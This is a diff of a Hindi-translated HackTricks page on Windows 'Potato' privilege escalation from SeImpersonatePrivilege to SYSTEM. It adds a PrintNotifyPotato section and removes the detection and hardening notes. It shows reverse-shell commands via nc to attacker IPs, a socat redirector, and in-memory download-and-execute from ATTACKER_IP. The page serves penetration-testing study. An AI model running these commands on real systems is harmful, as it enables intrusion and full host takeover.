@@ -3,10 +3,10 @@
 {{#include ../../banners/hacktricks-training.md}}
 
 > [!WARNING]
-> **JuicyPotato doesn't work** on Windows Server 2019 and Windows 10 build 1809 onwards. However, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** का उपयोग समान विशेषाधिकार प्राप्त करने और `NT AUTHORITY\SYSTEM` स्तर की पहुँच हासिल करने के लिए किया जा सकता है। यह [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) `PrintSpoofer` टूल पर गहराई से चर्चा करता है, जिसका उपयोग Windows 10 और Server 2019 होस्ट्स पर impersonation privileges का दुरुपयोग करने के लिए किया जा सकता है जहाँ JuicyPotato अब काम नहीं करता।
+> **JuicyPotato doesn't work** Windows Server 2019 और Windows 10 build 1809 के बाद पर काम नहीं करता। हालाँकि, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** का उपयोग समान privileges हासिल करने और `NT AUTHORITY\SYSTEM` स्तर की पहुँच प्राप्त करने के लिए किया जा सकता है। यह [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) `PrintSpoofer` tool पर गहराई से चर्चा करता है, जिसे उन Windows 10 और Server 2019 होस्ट्स पर impersonation privileges के दुरुपयोग के लिए इस्तेमाल किया जा सकता है जहाँ JuicyPotato अब काम नहीं करता।
 
 > [!TIP]
-> एक आधुनिक विकल्प जो अक्सर 2024–2025 में मेंटेन किया जा रहा है वह SigmaPotato (GodPotato का fork) है जो in-memory/.NET reflection उपयोग और विस्तारित OS समर्थन जोड़ता है। नीचे quick usage और References में repo देखें।
+> एक आधुनिक विकल्प जो 2024–2025 में अक्सर मेंटेन किया गया है वह SigmaPotato (GodPotato का fork) है जो in-memory/.NET reflection उपयोग और विस्तारित OS सपोर्ट जोड़ता है। नीचे त्वरित उपयोग देखें और रेपो को References में देखें।
 
 Related pages for background and manual techniques:
 
@@ -22,24 +22,24 @@ from-high-integrity-to-system-with-name-pipes.md
 privilege-escalation-abusing-tokens.md
 {{#endref}}
 
-## आवश्यकताएँ और सामान्य अड़चने
+## आवश्यकताएँ और सामान्य परेशानियाँ
 
-निम्नलिखित सभी तकनीकें उन impersonation-capable privileged सेवाओं का दुरुपयोग करने पर निर्भर करती हैं जिन्हें ऐसे संदर्भ से बुलाया जा सके जहाँ निम्नलिखित में से कोई एक privilege मौजूद हो:
+नीचे दी गई सभी तकनीकें ऐसे context से चलने वाली impersonation-capable privileged service का दुरुपयोग करने पर निर्भर करती हैं जिसके पास निम्नलिखित किसी एक privileges होते हैं:
 
 - SeImpersonatePrivilege (सबसे सामान्य) या SeAssignPrimaryTokenPrivilege
-- High integrity आवश्यक नहीं है यदि टोकन में पहले से SeImpersonatePrivilege मौजूद हो (आम तौर पर कई service accounts जैसे IIS AppPool, MSSQL, आदि के लिए)
+- यदि token में पहले से SeImpersonatePrivilege मौजूद है तो High integrity आवश्यक नहीं है (यह कई service accounts जैसे IIS AppPool, MSSQL आदि के लिए सामान्य होता है)
 
-अनुमतियाँ जल्दी जाँचें:
+Privileges जल्दी जाँचें:
 ```cmd
 whoami /priv | findstr /i impersonate
 ```
-ऑपरेशनल नोट्स:
+ऑपरेशन नोट्स:
 
-- यदि आपकी shell restricted token के तहत चलती है जिसमें SeImpersonatePrivilege नहीं है (कुछ संदर्भों में Local Service/Network Service के लिए सामान्य), तो खाते के डिफ़ॉल्ट विशेषाधिकार FullPowers का उपयोग करके पुनः प्राप्त करें, फिर एक Potato चलाएँ। उदाहरण: `FullPowers.exe -c "cmd /c whoami /priv" -z`
-- PrintSpoofer को Print Spooler service की आवश्यकता होती है जो चल रही हो और local RPC endpoint (spoolss) पर पहुँच योग्य हो। जहाँ Spooler को PrintNightmare के बाद बंद कर दिया गया है ऐसे कठोर वातावरण में RoguePotato/GodPotato/DCOMPotato/EfsPotato पसंद करें।
-- RoguePotato को TCP/135 पर पहुँच योग्य OXID resolver चाहिए। यदि egress ब्लॉक है, तो redirector/port-forwarder का उपयोग करें (नीचे दिए उदाहरण को देखें)। पुराने बिल्ड्स में -f flag की आवश्यकता होती थी।
-- EfsPotato/SharpEfsPotato MS-EFSR का दुरुपयोग करते हैं; यदि एक pipe ब्लॉक है, तो वैकल्पिक pipes आज़माएँ (lsarpc, efsrpc, samr, lsass, netlogon)।
-- RpcBindingSetAuthInfo के दौरान Error 0x6d3 आम तौर पर एक अज्ञात/असमर्थित RPC authentication service को दर्शाता है; अलग pipe/transport आज़माएँ या सुनिश्चित करें कि target service चल रही हो।
+- यदि आपकी shell किसी restricted token के तहत चल रही है जिसमें SeImpersonatePrivilege नहीं है (कुछ परिस्थितियों में Local Service/Network Service के लिए सामान्य), तो खाते के डिफ़ॉल्ट विशेषाधिकार FullPowers का उपयोग करके पुनः प्राप्त करें, फिर एक Potato चलाएँ। उदाहरण: `FullPowers.exe -c "cmd /c whoami /priv" -z`
+- PrintSpoofer को Print Spooler service चालू और स्थानीय RPC endpoint (spoolss) पर पहुँच योग्य चाहिए। हार्डन्ड वातावरणों में जहाँ Spooler को PrintNightmare के बाद अक्षम कर दिया गया हो, वहाँ RoguePotato/GodPotato/DCOMPotato/EfsPotato को प्राथमिकता दें।
+- RoguePotato को TCP/135 पर पहुँच योग्य OXID resolver की आवश्यकता होती है। यदि आउटगोइंग (egress) ट्रैफ़िक अवरुद्ध है, तो redirector/port-forwarder का उपयोग करें (नीचे उदाहरण देखें)। पुराने बिल्ड्स में -f flag की आवश्यकता थी।
+- EfsPotato/SharpEfsPotato MS-EFSR का दुरुपयोग करते हैं; यदि एक pipe अवरुद्ध है, तो वैकल्पिक pipes आज़माएँ (lsarpc, efsrpc, samr, lsass, netlogon)।
+- RpcBindingSetAuthInfo के दौरान Error 0x6d3 आमतौर पर किसी अज्ञात/अनसमर्थित RPC authentication सेवा को दर्शाता है; किसी अलग pipe/transport का प्रयास करें या सुनिश्चित करें कि लक्ष्य सेवा चल रही है।
 
 ## त्वरित डेमो
 
@@ -59,8 +59,8 @@ NULL
 
 ```
 नोट्स:
-- आप -i का उपयोग वर्तमान कंसोल में एक इंटरैक्टिव प्रक्रिया शुरू करने के लिए कर सकते हैं, या -c का उपयोग एक one-liner चलाने के लिए कर सकते हैं।
-- Spooler service की आवश्यकता होती है। यदि यह disabled है, तो यह विफल होगा।
+- आप -i का उपयोग वर्तमान कंसोल में एक इंटरैक्टिव प्रोसेस शुरू करने के लिए कर सकते हैं, या एक-लाइनर चलाने के लिए -c का उपयोग कर सकते हैं।
+- इसके लिए Spooler service आवश्यक है। यदि यह निष्क्रिय है, तो यह विफल होगा।
 
 ### RoguePotato
 ```bash
@@ -68,7 +68,7 @@ c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l
 # In some old versions you need to use the "-f" param
 c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
 ```
-यदि आउटबाउंड 135 ब्लॉक है, तो अपने redirector पर socat के माध्यम से OXID resolver को pivot करें:
+यदि outbound 135 अवरुद्ध है, अपने redirector पर socat के माध्यम से OXID resolver को pivot करें:
 ```bash
 # On attacker redirector (must listen on TCP/135 and forward to victim:9999)
 socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999
@@ -76,6 +76,25 @@ socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999
 # On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
 RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
 ```
+### PrintNotifyPotato
+
+PrintNotifyPotato एक नया COM abuse primitive है जो late 2022 में जारी हुआ और Spooler/BITS के बजाय **PrintNotify** service को लक्षित करता है। बाइनरी PrintNotify COM server को instantiate करता है, एक fake `IUnknown` डालता है, फिर `CreatePointerMoniker` के जरिए एक privileged callback ट्रिगर करता है। जब PrintNotify service (जो **SYSTEM** के रूप में चल रही होती है) वापस कनेक्ट करती है, तो प्रक्रिया लौटाए गए token को duplicate कर लेती है और दिए गए payload को पूर्ण privileges के साथ spawn कर देती है।
+
+Key operational notes:
+
+* Works on Windows 10/11 and Windows Server 2012–2022 as long as the Print Workflow/PrintNotify service is installed (it is present even when the legacy Spooler is disabled post-PrintNightmare).
+* Requires the calling context to hold **SeImpersonatePrivilege** (typical for IIS APPPOOL, MSSQL, and scheduled-task service accounts).
+* Accepts either a direct command or an interactive mode so you can stay inside the original console. Example:
+
+```cmd
+PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
+PrintNotifyPotato.exe whoami
+```
+
+* Because it is purely COM-based, no named-pipe listeners or external redirectors are required, making it a drop-in replacement on hosts where Defender blocks RoguePotato’s RPC binding.
+
+Operators such as Ink Dragon fire PrintNotifyPotato immediately after gaining ViewState RCE on SharePoint to pivot from the `w3wp.exe` worker to SYSTEM before installing ShadowPad.
+
 ### SharpEfsPotato
 ```bash
 > SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
@@ -112,7 +131,7 @@ CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes su
 
 nt authority\system
 ```
-टिप: यदि एक pipe विफल हो जाए या EDR इसे ब्लॉक कर दे, तो अन्य समर्थित pipes आज़माएँ:
+टिप: यदि एक pipe विफल हो या EDR उसे ब्लॉक कर दे, तो अन्य समर्थित pipes आज़माएँ:
 ```text
 EfsPotato <cmd> [pipe]
 pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
@@ -123,14 +142,14 @@ pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
 # You can achieve a reverse shell like this.
 > GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
 ```
-नोट्स:
-- Windows 8/8.1–11 और Server 2012–2022 पर काम करता है जब SeImpersonatePrivilege मौजूद हो।
+नोट:
+- Windows 8/8.1–11 और Server 2012–2022 पर तब काम करता है जब SeImpersonatePrivilege मौजूद हो।
 
 ### DCOMPotato
 
 ![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)
 
-DCOMPotato सेवा DCOM objects को लक्षित करने वाले दो वेरिएंट प्रदान करता है जो डिफ़ॉल्ट रूप से RPC_C_IMP_LEVEL_IMPERSONATE पर होते हैं। प्रदान किए गए binaries को बनाएं या उपयोग करें और अपना कमांड चलाएँ:
+DCOMPotato सेवा DCOM ऑब्जेक्ट्स को लक्षित करने वाले दो वेरिएंट प्रदान करता है, जो डिफ़ॉल्ट रूप से RPC_C_IMP_LEVEL_IMPERSONATE पर रहते हैं। Build करें या दिए गए binaries का उपयोग करें और अपना कमांड चलाएँ:
 ```cmd
 # PrinterNotify variant
 PrinterNotifyPotato.exe "cmd /c whoami"
@@ -138,9 +157,9 @@ PrinterNotifyPotato.exe "cmd /c whoami"
 # McpManagementService variant (Server 2022 also)
 McpManagementPotato.exe "cmd /c whoami"
 ```
-### SigmaPotato (updated GodPotato fork)
+### SigmaPotato (अपडेट किया गया GodPotato fork)
 
-SigmaPotato आधुनिक सुविधाएँ जोड़ता है, जैसे in-memory execution via .NET reflection और PowerShell reverse shell helper।
+SigmaPotato आधुनिक सुविधाएँ जोड़ता है, जैसे in-memory execution via .NET reflection और PowerShell reverse shell helper.
 ```powershell
 # Load and execute from memory (no disk touch)
 [System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
@@ -149,15 +168,7 @@ SigmaPotato आधुनिक सुविधाएँ जोड़ता ह�
 # Or ask it to spawn a PS reverse shell
 [SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
 ```
-## डिटेक्शन और हार्डनिंग नोट्स
-
-- Monitor for processes creating named pipes and immediately calling token-duplication APIs followed by CreateProcessAsUser/CreateProcessWithTokenW. Sysmon उपयोगी टेलीमेट्री दिखा सकता है: Event ID 1 (process creation), 17/18 (named pipe created/connected), और command lines जो SYSTEM के रूप में child processes उत्पन्न करते हैं।
-- Spooler hardening: उन सर्वरों पर जहाँ इसकी आवश्यकता नहीं है Print Spooler सेवा को disable करना spoolss के माध्यम से PrintSpoofer-style स्थानीय coercions को रोकता है।
-- Service account hardening: custom services को SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege देने को न्यूनतम रखें। आवश्यक न्यूनतम privileges वाले virtual accounts के तहत services चलाने पर विचार करें और जहाँ संभव हो उन्हें service SID और write-restricted tokens से isolate करें।
-- Network controls: outbound TCP/135 को block करना या RPC endpoint mapper ट्रैफ़िक को restrict करना RoguePotato को बाधित कर सकता है सिवाय इसके कि कोई internal redirector उपलब्ध हो।
-- EDR/AV: ये सभी tools व्यापक रूप से signatured हैं। source से recompiling, symbols/strings का नाम बदलना, या in-memory execution का उपयोग detection को कम कर सकता है लेकिन मजबूत behavioral detections को हरा नहीं पाएगा।
-
-## संदर्भ
+## References
 
 - [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
 - [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
@@ -168,7 +179,9 @@ SigmaPotato आधुनिक सुविधाएँ जोड़ता ह�
 - [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
 - [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
 - [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
-- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
+- [FullPowers – service accounts के लिए डिफ़ॉल्ट token privileges पुनर्स्थापित करें](https://github.com/itm4n/FullPowers)
 - [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
+- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
+- [Check Point Research – Inside Ink Dragon: एक गुप्त आक्रामक अभियान के रिले नेटवर्क और आंतरिक कार्यप्रणाली का खुलासा](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
 
 {{#include ../../banners/hacktricks-training.md}}
